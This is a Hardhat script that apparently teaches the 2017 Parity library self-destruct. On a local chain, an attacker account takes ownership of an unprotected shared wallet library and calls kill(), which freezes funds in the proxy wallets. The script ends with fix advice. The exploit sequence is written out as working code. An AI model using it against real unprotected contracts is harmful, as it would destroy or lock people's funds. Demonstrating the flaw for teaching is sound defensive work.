const { ethers } = require("hardhat");

async function main() {
  const [deployer, ownerA, ownerB, ownerC, attacker, recipient] = await ethers.getSigners();

  console.log("=== Part 3: Parity Hack #2 (Library Self-Destruct) ===");
  const Lib = await ethers.getContractFactory("WalletLibraryVulnerable", deployer);
  const lib = await Lib.deploy();
  await lib.waitForDeployment();

  const Proxy = await ethers.getContractFactory("WalletProxy", deployer);
  const walletA = await Proxy.deploy(await lib.getAddress());
  const walletB = await Proxy.deploy(await lib.getAddress());
  const walletC = await Proxy.deploy(await lib.getAddress());
  await Promise.all([walletA.waitForDeployment(), walletB.waitForDeployment(), walletC.waitForDeployment()]);

  const abi = Lib.interface.fragments;
  const a = new ethers.Contract(await walletA.getAddress(), abi, ownerA);
  const b = new ethers.Contract(await walletB.getAddress(), abi, ownerB);
  const c = new ethers.Contract(await walletC.getAddress(), abi, ownerC);

  await (await a.initWallet(await ownerA.getAddress())).wait();
  await (await b.initWallet(await ownerB.getAddress())).wait();
  await (await c.initWallet(await ownerC.getAddress())).wait();

  await ownerA.sendTransaction({ to: await walletA.getAddress(), value: ethers.parseEther("2") });
  await ownerB.sendTransaction({ to: await walletB.getAddress(), value: ethers.parseEther("2") });
  await ownerC.sendTransaction({ to: await walletC.getAddress(), value: ethers.parseEther("2") });
  console.log("Funded 3 wallets that share one library.");

  const libAsAttacker = new ethers.Contract(await lib.getAddress(), abi, attacker);
  await (await libAsAttacker.initWallet(await attacker.getAddress())).wait();
  await (await libAsAttacker.kill()).wait();

  const codeAfter = await ethers.provider.getCode(await lib.getAddress());
  console.log("Library bytecode length after kill:", codeAfter.length);

  const recipientBefore = await ethers.provider.getBalance(await recipient.getAddress());
  const walletABefore = await ethers.provider.getBalance(await walletA.getAddress());
  try {
    await (await a.execute(await recipient.getAddress(), ethers.parseEther("1"))).wait();
    console.log("execute() tx did not revert, but check balances for frozen-funds behavior.");
  } catch {
    console.log("execute() reverted after library destruction.");
  }
  const recipientAfter = await ethers.provider.getBalance(await recipient.getAddress());
  const walletAAfter = await ethers.provider.getBalance(await walletA.getAddress());

  console.log("Recipient delta:", ethers.formatEther(recipientAfter - recipientBefore), "ETH");
  console.log("WalletA delta  :", ethers.formatEther(walletAAfter - walletABefore), "ETH");
  console.log("If deltas are zero, funds are frozen because logic is gone.");

  console.log("\nRecommended fix:");
  console.log("1) Access-control every privileged function.");
  console.log("2) Do not expose public selfdestruct in shared library.");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
